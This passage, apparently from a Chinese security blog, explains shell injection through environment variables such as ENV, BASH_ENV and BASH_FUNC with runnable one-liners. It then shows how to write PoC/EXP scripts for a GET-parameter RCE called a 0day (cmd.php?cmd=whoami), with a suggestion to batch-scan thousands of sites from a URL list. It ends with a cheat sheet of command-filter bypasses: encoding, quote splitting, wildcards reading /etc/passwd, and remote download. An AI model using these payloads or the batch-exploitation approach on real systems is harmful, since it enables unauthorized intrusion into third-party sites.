![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59biaicKico5ybQAqXpFGWicOefLLNr2Rnt8yiabVDfOLiccXvJB4WPS5hCmHA/640?wx_fmt=png)

        这篇文章已经说得很详细了

        https://tttang.com/archive/1450/

        所以这里只是简单总结，如果想深入研究可以看看这篇帖子

        下载源码然后看到这个文件 \ glibc-2.31\libio\iopopen.c，我们可以在 89 行看到的执行 sh -c，加上 p 牛的那段代码，最终输出的是 sh -c echo hello

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59dBzEuX89LIqhZiaviaLNadlrSbZqfej3CnFsj3qWJ84ReM2kW6ficeiaZw/640?wx_fmt=png)

        Readfile 的目的是读取 SHELL 中的 profile 文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG594hd5Dz8QvcL1Ts6Mctibd8WHU62ibAJIk6x40n33E5vfXtZPfeGiagmuw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59nAYfhLqqXnEbloh68u1VxFuUrD5xgsjrfuGoC5sMrpJZoCo5Lc8s1A/640?wx_fmt=png)

        然后我们可以看到这段代码的 257 行，name 被 expandstr 解析

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59romyO1xStQVaUrnNrehzXoQiaJbZlzbJiaicNt4qzWfoq8M85z4WNA8sg/640?wx_fmt=png)

        文章里说，iflag 经过分析是表示是否传入 - i 参数，然后我溯源的时候发现应该是在 \ dash-0.5.10.2\src\options.h 文件和 \ dash-0.5.10.2\src\options.c 文件中定义的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59ZBBAhNZl6udYsE8ZXXXuUECCk5J9iaeAHric65Zer4FsvJXXia9KGABaA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59dlZhrGtB43jalFgicFgTOZVibhEydmicCKtrGauRSIWUuWWfuFnHXs4LA/640?wx_fmt=png)

        所以后面传参过去 - i -c 就可以了

```
ENV='$(id1>&2)' dash -i -c 'echo hello'
```

        最后经过大佬的分析，在文件 variables.c 这段代码中

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59ibG0ZIBP5lHdbb2IKic2hY3a48SGOJhibkyjLWbY03h7yFVHq6P6icJYicg/640?wx_fmt=png)

        Parse_and_execute 执行 temp_string

        我们可以在 bash-4.4-beta2\bash-4.4-beta2\builtins\evalstring.c 文件看到该函数

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59ED8EOCZCSQbUqjxncSppTZLucJVn4JfHeXBzCibprmHN0OlwT1trstw/640?wx_fmt=png)

        不过其实哪怕看其他几个传参点也能知道 parse_and_excute 执行的就是 shell 命令

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59kiaWcefoz7iaibhRpXryia3cstVnnicpGAjib5Dg2NaKyw4EJWhVOZvedeyA/640?wx_fmt=png)

        最后以 p 牛给的几个途径完结

        BASH_ENV：可以在 bash -c 的时候注入任意命令

        ENV：可以在 sh -i -c 的时候注入任意命令

        PS1：可以在 sh 或 bash 交互式环境下执行任意命令

        PROMPT_COMMAND：可以在 bash 交互式环境下执行任意命令

        BASH_FUNC_xxx%%：可以在 bash -c 或 sh -c 的时候执行任意命令

```
env 'BASH_FUNC_echo()=() { id; }' bash -c "echo hello"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59GxcPhDmCWf1mexgbyiaw5icbw6Y9XibqicnOOljPBjJn43e9oITpibLSgfQ/640?wx_fmt=png)

        当然除了这种，还有个 LD_PRELOAD，我这里就不复现了，感兴趣的可以看看

        http://www.hackdig.com/01/hack-572721.htm

17  

**17**

POC/EXP 编写

        RCE 的原理大家基本都懂了，但比如挖到了 0day，基本都是几千个站及以上了，如果刷分的话手测得累死，所以需要自己开发 poc 进行批量探测

        这里先拿一个简单的 get 传参的 rce 来写

        用一个小 0day 来做示范，如下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59iaxVGME64Lewd7768I60OCEtqwbSPdp7tletTeKJk5sSOzprAf8NwXg/640?wx_fmt=png)

        利用 payload

```
/data/manage/cmd.php?cmd=whoami
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59l3YqYL8gwpPnicn1agkyggLJth5AmSjrAOwo2RrZWV40v3o3cLMniaXA/640?wx_fmt=png)

        可以看到成功回显  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59IG1lmQmxCtTYvFJoJKWkwYZRibqxIFMOlu2Hr6D2skTHJTP35Zun0icA/640?wx_fmt=png)

        那么思路就很清晰了，rce 直接用输出的数据，然后判断返回包是否存在，导入 request 包，然后传参，判断返回包是否存在我们想要的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59DibZZhRTdlPaic9J4fe6Ow4ibNwOticgF94HfunOjYQyaUMUibTsruZKztw/640?wx_fmt=png)

        Exp 编写如下：

        我们可以看到 <br><pre > 后面使我们的命令回显，那么我们之前的字符都不需要，所以 print 出下标和整个 html 代码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59yktqV5FDX4ECia6doTAnXw3x1QsXJiaQ8b2xbWC84UJOQHTnoy2L7O5Q/640?wx_fmt=png)

        我们可以看到我们的命令回显在 < 这里开头后的第九个位置，于是取到下标 b，从下标 b 开始到最后的都是我们的命令回显，那么就可以轻而易举的写出来 exp

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG590bFDCQsnbsXyicuubVbiboDvHEeTTzzuNocHcxicXzjeofS2qn93sQPvQ/640?wx_fmt=png)

        当然这只是 get 的方法，那么 post 的 poc/exp 该如何编写呢？两者差不多，区别就在于该如何传参

        这里拿出一个某网关的 rce 做案例，可以看到，判断 flag 是否等于 1，如果等于 1 就直接拼接参数 sipdev，然后 exec 无过滤直接输出

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59kFPHJXCRIZrFNfjC64f0t5a1XALrKuVnMUqIqnYU5iaNfJZhNT7UMRA/640?wx_fmt=png)

        然后漏洞复现，因为这时候我的 burp 突然坏了，所以用 google 的 hackbar 来利用，就是没 burp 直接看返回包方便

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59M1zmMqVMLQiaELYDkQqIxGgkeNgUAibpSEicFlDmnXw6sicseE1NBMoZOA/640?wx_fmt=png)

        成功 RCE

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59Eicr1lnvau50fNVgjSnVbxyUbwQbMLWJCtCU8j07H0ozLN9eveUWFYw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59fzgbtrwbsGvYuBZ59k0fscfrpSbScWIna8X4yp1UxNYAgC1tPeI7qg/640?wx_fmt=png)

        简单 poc 编写

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59Rx84l3INIHibP4jLQFicmviaX5BAztMzAnL5CzVTTDFMJ8DO3OOvSNHrg/640?wx_fmt=png)

        简单 exp 编写

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59pKtdNRwQhibsYJwvDPJloLibMbarZP3jBQbLpEd7qibOtSGaNgu40yhSQ/640?wx_fmt=png)

        如果批量的话只需要同目录建一个 url.txt，然后 with open 打开遍历就行了，网上文章很多很基础，这里就不做演示了

18  

**18**

Bypass 笔记

        基本案例就这些了，最后在加上一些 RCEbypass 的方法（本人 java 并不是很好，所以这里只有 php 和 shell 系统命令之类的），有些复现过有些没复现，可自行测试，可能不是很全，也欢迎大佬联系我进行补充

        1. 变量 bypass

        a=c;b=a;c=t;

        $a$b$c /etc/passwd

        2.16 编码绕过

        "\x73\x79\x73\x74\x65\x6d"("cat /etc/passwd");

        3.oct 编码绕过

        $(printf "\154\163")//ls 命令

        4. 拼接绕过

        sy.(st).em(whoami);//

        c''a''t /etc/passwd// 单引

        c""a""t /etc/passwd// 双引

        c``a``t /etc/passwd / 反单引

        c\a\t /etc/passwd// 反斜线

        $* 和 $@，$x(x 代表 1-9),${x}(x>=10) : 比如 ca${21}t a.txt 表示 cat a.txt 在没有传入参数的情况下, 这些特殊字符默认为空, 如下:

        wh$1oami

        who$@ami

        whoa$*mi

        5. 利用未赋值变量绕过

        cat /etc$u/passwd

        cat$u /etc/passwd

        6. 通配符绕过

        cat /passwd：

        ??? /e??/?a????

        cat /e*/pa*

        7.base 编码绕过

        echo 'Y2F0wqAK' | base64 -d '1.txt'

        8. 过滤分割符 | & ；

         ;  // 分号

         |  // 只执行后面那条命令

         ||  // 只执行前面那条命令

         & // 两条命令都会执行

         && // 两条命令都会执行

         %0a     // 换行符

         %0d    // 回车符号

         用?> 代替；

         在 php 中可以用?> 来代替最后的一个；，因为 php 遇到定界符关闭标签会自动在末尾加上一个分号

        9. 远程下载 / 复制绕过

        Copy，wget，curl 等函数，不直接写入文件，而是远程下载来保存文件

        当然除了这些肯定还有很多绕过方法，不过本篇文章不着重于此处，可自行搜索

        文章中部分是互联网的案例与素材，上上下下看了快几百个网站进行资料查找，问了很多大佬，全程自己打字写所以肯定会有错误，看到有技术性错误私聊我进行修改 or 删除，因为参考站点太多了，这里就不一一写引用了，如有侵权请私信我修改 or 删除  

**宣传页  
**

**ZAC 安全  
**

本人微信：zacaq999   
文章内容如有任何错误或者对不上号的，可以加我微信，感谢各位大佬们的指点